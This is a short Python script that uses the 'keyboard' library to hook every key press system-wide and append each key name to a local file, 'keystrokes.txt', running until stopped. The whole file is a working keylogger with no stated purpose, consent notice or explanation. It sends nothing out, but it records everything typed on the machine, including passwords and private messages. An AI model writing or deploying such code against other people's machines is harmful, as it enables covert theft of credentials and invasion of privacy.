import keyboard
text_file = "keystrokes.txt"

def on_key_press(event):
    with open(text_file, "a") as f:
        f.write(event.name)
        f.write("\n")

keyboard.on_press(on_key_press)
keyboard.wait()